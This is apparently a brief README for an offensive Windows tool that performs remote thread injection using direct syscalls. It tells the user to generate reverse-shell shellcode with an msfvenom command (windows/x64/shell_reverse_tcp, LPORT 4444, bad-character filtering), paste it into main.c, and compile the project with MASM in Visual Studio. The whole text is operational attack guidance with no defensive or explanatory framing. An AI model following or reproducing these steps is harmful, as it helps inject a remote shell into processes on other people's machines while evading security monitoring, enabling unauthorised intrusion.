## Remote Thread Injection Using Direct Syscalls
* create your shellcode and replace it in main.c:
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4444 -b '\x00\x0a\x0d' -f c
```

* Add all of the file to a Visual Studio Project
* Enable MASM in your Visual Studio Project
* Change Project Charset if it's UNICODE
* Compile it
